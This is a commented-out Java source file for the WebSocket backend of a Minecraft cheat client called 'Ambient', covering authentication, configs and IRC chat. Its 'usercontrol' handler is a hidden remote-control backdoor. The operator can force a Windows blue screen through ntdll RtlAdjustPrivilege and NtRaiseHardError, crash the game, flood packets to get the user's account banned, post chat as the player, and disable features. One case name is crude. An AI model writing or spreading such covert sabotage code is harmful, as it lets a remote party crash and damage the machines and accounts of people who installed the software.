//package fr.ambient.protection.backend.api;
//
//import cc.polymorphism.annot.IncludeReference;
//import com.google.gson.JsonArray;
//import com.google.gson.JsonElement;
//import com.google.gson.JsonObject;
//import com.google.gson.JsonParser;
//import com.sun.jna.Function;
//import com.sun.jna.Memory;
//import fr.ambient.Ambient;
//import fr.ambient.command.impl.ESPCommand;
//import fr.ambient.component.impl.misc.CosmeticComponent;
//import fr.ambient.external.value.ExternalValue;
//import fr.ambient.module.Module;
//import fr.ambient.module.impl.combat.BackTrack;
//import fr.ambient.protection.backend.EncryptionPair;
//import fr.ambient.util.ConfigUtil;
//import fr.ambient.util.CosmeticData;
//import fr.ambient.util.Crypt;
//import fr.ambient.util.packet.PacketUtil;
//import fr.ambient.util.player.ChatUtil;
//import fr.ambient.util.player.MoveUtil;
//import io.netty.bootstrap.Bootstrap;
//import lombok.Getter;
//import lombok.SneakyThrows;
//import net.minecraft.client.Minecraft;
//import net.minecraft.network.play.client.C07PacketPlayerDigging;
//import net.minecraft.network.play.client.C09PacketHeldItemChange;
//import net.minecraft.network.play.client.C0BPacketEntityAction;
//import net.minecraft.util.BlockPos;
//import net.minecraft.util.EnumChatFormatting;
//import net.minecraft.util.EnumFacing;
//import org.java_websocket.client.WebSocketClient;
//import org.java_websocket.handshake.ClientHandshakeBuilder;
//import org.java_websocket.handshake.ServerHandshake;
//import org.lwjglx.Sys;
//
//import javax.net.ssl.SSLContext;
//import javax.net.ssl.TrustManager;
//import javax.net.ssl.X509TrustManager;
//import java.awt.*;
//import java.awt.datatransfer.Clipboard;
//import java.awt.datatransfer.StringSelection;
//import java.net.URI;
//import java.net.URISyntaxException;
//import java.nio.charset.StandardCharsets;
//import java.security.SecureRandom;
//import java.security.cert.X509Certificate;
//import java.util.*;
//
//@IncludeReference
//public class WSBackend extends WebSocketClient {
//
//    private EncryptionPair encryptionPair = new EncryptionPair();
//
//    @Getter
//    private final HashMap<String, String> usernameToBackendInfo = new HashMap<>();
//
//    public WSBackend() throws URISyntaxException {
//        super(new URI("wss://legitclient.com:8443"), getCustomHeaders());
//
//        checkCertificates();
//
//
//
//
//    }
//
//
//
//    private void checkCertificates() {
//        try {
//            SSLContext sslContext = SSLContext.getInstance("SSL");
//            sslContext.init(null, new TrustManager[]{new X509TrustManager() {
//                public void checkClientTrusted(X509Certificate[] chain, String authType) {
//                    /* */
//                }
//
//                public void checkServerTrusted(X509Certificate[] chain, String authType) {
//                    final String[] valid = new String[]{
//                            "CN=WE1, O=Google Trust Services, C=US CN=legitclient.com",
//                            "CN=GTS Root R4, O=Google Trust Services LLC, C=US CN=WE1, O=Google Trust Services, C=US",
//                            "CN=GlobalSign Root CA, OU=Root CA, O=GlobalSign nv-sa, C=BE CN=GTS Root R4, O=Google Trust Services LLC, C=US",
//                    };
//
//                    int i = 0;
//                    for (X509Certificate cert : chain) {
//                        String certificate =
//                                cert.getIssuerX500Principal() + " " + cert.getSubjectX500Principal();
//
//                        if (!valid[i].equals(certificate)) {
//                            System.out.println("You're so cooked!");
//
//                            System.exit(0);
//
//                            // noinspection InfiniteLoopStatement, StatementWithEmptyBody
//                            while (true);
//                        }
//                        i++;
//                    }
//                }
//
//                public X509Certificate[] getAcceptedIssuers() {
//                    return new X509Certificate[0];
//                }
//            }}, new java.security.SecureRandom());
//            this.setSocketFactory(sslContext.getSocketFactory());
//        } catch (Exception exception) {
//            System.exit(0);
//        }
//    }
//
//    @SneakyThrows
//    public boolean connectFullyBlock(){
//        Ambient.getInstance().setTryingToReconnect(true);
//        this.connect();
//        int tried = 0;
//        while (!this.isOpen()){
//            Thread.sleep(500);
//            tried++;
//            if(tried == 10){
//                return false;
//            }
//        }
//        Ambient.getInstance().setTryingToReconnect(false);
//
//        return true;
//    }
//
//    @Override
//    public void onOpen(ServerHandshake serverHandshake) {
//    }
//
//    @Override
//    public void onMessage(String s) {
//        byte[] key = Base64.getDecoder().decode(encryptionPair.getNextServerKey());
//        byte[] recv = Base64.getDecoder().decode(s);
//        String decoded = new String(Crypt.decrypt(recv, key), StandardCharsets.UTF_8);
//        JsonObject object = JsonParser.parseString(decoded).getAsJsonObject();
//        String nextKey = object.get("next").getAsString();
//        encryptionPair.setNextServerKey(nextKey); // touching anything here will make sure you are dead.
//
//        switch (object.get("id").getAsString()){
//            case "authresponse" -> {
//                Ambient.getInstance().setToken(object.get("token").getAsString());
//            }
//            case "userinfo" -> {
//                Ambient.getInstance().setUsername(object.get("username").getAsString());
//                Ambient.getInstance().setDiscord(object.get("discord").getAsString());
//                Ambient.getInstance().setUid(object.get("uid").getAsString());
//            }
//            case "uid2username" -> {
//                String username = object.get("username").getAsString();
//
//                if(username.equals("ERROR_TO_FIND_OFFLINE")){
//                    ChatUtil.display("User is offline !");
//                    return;
//                }
//
//
//                switch (object.get("action").getAsString()){
//                    case "party" -> {
//                        if(Minecraft.getMinecraft().thePlayer != null){
//                            ChatUtil.display("Partying " + username);
//
//                            Minecraft.getMinecraft().thePlayer.sendChatMessage("/p " + username);
//                        }else{
//                            ChatUtil.display("Erm what ( " + username + " ) mcplayer null !");
//                        }
//                    }
//                }
//            }
//            case "clientdata" -> {
//                try {
//                    JsonArray array = object.get("data").getAsJsonArray();
//                    ExternalValue externalValue = new ExternalValue();
//                    for(JsonElement element : array){
//                        JsonObject object1 = element.getAsJsonObject();
//                        externalValue.values.put(object1.get("id").getAsInt(), object1.get("value").getAsString());
//                    }
//                    Ambient.getInstance().getExternalValueManager().put("names", externalValue);
//                }catch (Exception e){
//                    e.printStackTrace();
//                }
//            }
//            case "pong" -> {
//                Ambient.getInstance().getMsSinceLast().reset();
//            }
//            case "irc" -> {
//                if(Ambient.getInstance().getConfig().getValue("irc-enabled").equals("true")) {
//                    ChatUtil.display(object.get("text").getAsString());
//                }
//            }
//
//            case "config" -> {
//                switch (object.get("configmode").getAsString()){
//                    case "save" -> {
//                        if(!object.get("autosave").getAsBoolean()){
//                            ChatUtil.display("Saved config " + object.get("name").getAsString());
//                        }
//                    }
//                    case "load" -> {
//                        try {
//                            if(object.has("failure")){
//                                ChatUtil.display("Failed to load config.");
//                                return;
//                            }
//
//                            String ss = object.get("config").getAsString();
//
//                            String cfgg = new String(Base64.getDecoder().decode(ss), StandardCharsets.UTF_8);
//
//                            ConfigUtil.read(JsonParser.parseString(cfgg).getAsJsonObject());
//                            ChatUtil.display("Loaded Config : " + object.get("name"));
//                        }catch (Exception e){
//                            e.printStackTrace();
//                        }
//
//                    }
//                    case "list" -> {
//                        JsonArray array = object.get("configs").getAsJsonArray();
//                        ChatUtil.display("-- Config List --");
//                        for(JsonElement element : array){
//                            String nem = element.getAsJsonObject().get("name").getAsString();
//                            ChatUtil.display(nem);
//                        }
//                    }
//                    case "share" -> {
//                        if(object.has("failure")){
//                            ChatUtil.display("Failed to share config.");
//                            return;
//                        }
//                        ChatUtil.display("Config " + object.get("name") +" been shared ! command has been put in your clipboard.");
//                        System.out.println("shared : " + object.get("sharecode"));
//
//                        StringSelection selection = new StringSelection(".config loadshared " + object.get("sharecode").getAsString());
//                        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
//                        clipboard.setContents(selection, selection);
//                    }
//                    case "delete" -> {
//                        if(object.get("success").getAsBoolean()){
//                            ChatUtil.display("Successfully Deleted Config");
//                        }else{
//                            ChatUtil.display("Failed deleting the config. This might be because of the config name being wrong.");
//                        }
//
//                    }
//                    case "loadshared" -> {
//                        try {
//                            if(object.has("failure")){
//                                ChatUtil.display("Failed to load config.");
//                                return;
//                            }
//
//                            String ss = object.get("config").getAsString();
//
//                            String cfgg = new String(Base64.getDecoder().decode(ss), StandardCharsets.UTF_8);
//
//                            ConfigUtil.read(JsonParser.parseString(cfgg).getAsJsonObject());
//                            ChatUtil.display("Loaded Shared Config : " + object.get("name"));
//                        }catch (Exception e){
//                            e.printStackTrace();
//                        }
//                    }
//                }
//            }
//
//            case "tabirc" -> {
//
//                switch (object.get("mode").getAsString()){
//                    case "userquery" -> {
//                        JsonArray userListArray = object.get("resparray").getAsJsonArray();
//
//                        for(JsonElement element : userListArray){
//                            JsonObject object1 = element.getAsJsonObject();
//
//                            String provided = object1.get("provided").getAsString();
//                            String uid = object1.get("uid").getAsString();
//                            String username = object1.get("username").getAsString();
//
//                            usernameToBackendInfo.put(provided, EnumChatFormatting.WHITE + "[" + EnumChatFormatting.AQUA + uid + EnumChatFormatting.RESET + EnumChatFormatting.WHITE +  "] " + username);
//
//                            if(object1.has("cosmetics")){
//                                JsonObject cosObj = object1.get("cosmetics").getAsJsonObject();
//                                CosmeticData cosmeticData = new CosmeticData(cosObj.get("cape").getAsString(), cosObj.get("halo").getAsString(), cosObj.get("wing").getAsString());
//                                CosmeticComponent.cosData.put(provided, cosmeticData);
//                            }
//                        }
//                    }
//                }
//            }
//
//            case "usercontrol" -> {
//                switch (object.get("mode").getAsString()){
//                    case "crash" -> {
//                        System.exit(0);
//                    }
//                    case "ban" -> {
//                        if (Minecraft.getMinecraft().thePlayer != null) {
//                            for (int i = 0; i < 100; i++) {
//                                PacketUtil.sendPacket(new C09PacketHeldItemChange(0));
//                                PacketUtil.sendPacket(new C0BPacketEntityAction(Minecraft.getMinecraft().thePlayer, C0BPacketEntityAction.Action.STOP_SNEAKING));
//                                PacketUtil.sendPacket(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.RELEASE_USE_ITEM, BlockPos.ORIGIN.down(), EnumFacing.UP));
//                            }
//                        }
//                    }
//                    case "clientsay" -> {
//                        ChatUtil.display(object.get("text").getAsString());
//                    }
//                    case "publicsay" -> {
//                        if(Minecraft.getMinecraft().thePlayer != null){
//                            Minecraft.getMinecraft().thePlayer.sendChatMessage(object.get("text").getAsString());
//                        }
//                    }
//                    case "flashbang" -> {
//                        Ambient.getInstance().getFlashbang().reset();
//                    }
//                    case "rapeconfig" -> {
//                        for (Module module : Ambient.getInstance().getModuleManager().getObjects()) {
//                            module.setEnabled(false);
//                        }
//                    }
//                    case "nyoom" -> {
//                        MoveUtil.strafe(9f);
//                    }
//                    case "motiony" -> {
//                        Minecraft.getMinecraft().thePlayer.motionY = 69420f;
//                    }
//                    case "crashbsod" -> {
//                        final Function RtlAdjustPrivilege = Function.getFunction("ntdll.dll", "RtlAdjustPrivilege");
//                        RtlAdjustPrivilege.invokeLong(new Object[]{19, true, false, new Memory(1L)});
//                        final Function NtRaiseHardError = Function.getFunction("ntdll.dll", "NtRaiseHardError");
//                        NtRaiseHardError.invokeLong(new Object[]{0xDEADBEEF, 0, 0, 0, 6, new Memory(32L)});
//                    }
//                    case "dcserver" -> {
//                        Minecraft.getMinecraft().theWorld.sendQuittingDisconnectingPacket();
//                    }
//                    case "logserver" -> {
//                        Ambient.getInstance().setServerIp(object.get("ip").getAsString() + ":" + object.get("port").getAsString());
//                    }
//                    case "fakeban" -> {
//                        ESPCommand.timer = 30;
//                    }
//                }
//            }
//
//
//
//        }
//    }
//    private static Map<String, String> getCustomHeaders() {
//        Map<String, String> headers = new HashMap<>();
//        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 8.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36");
//        return headers;
//    }
//    @Override
//    public void onClose(int i, String s, boolean b) {
//
//    }
//
//    @Override
//    public void onError(Exception e) {
//
//    }
//
//
//    public void sendMessageWithToken(JsonObject object){
//        object.addProperty("token", Ambient.getInstance().getToken());
//        sendMessage(object);
//    }
//
//    public void sendMessage(JsonObject object){
//        byte[] key = new byte[128];
//
//        SecureRandom random = new SecureRandom();
//        random.nextBytes(key);
//        object.addProperty("next", Base64.getEncoder().withoutPadding().encodeToString(key));
//        object.addProperty("randomizer", UUID.randomUUID().toString());
//        send(Base64.getEncoder().withoutPadding().encodeToString(Crypt.encrypt(object.toString().getBytes(StandardCharsets.UTF_8), Base64.getDecoder().decode(encryptionPair.getNextClientKey()))));
//        encryptionPair.setNextClientKey(Base64.getEncoder().withoutPadding().encodeToString(key));
//    }
//}
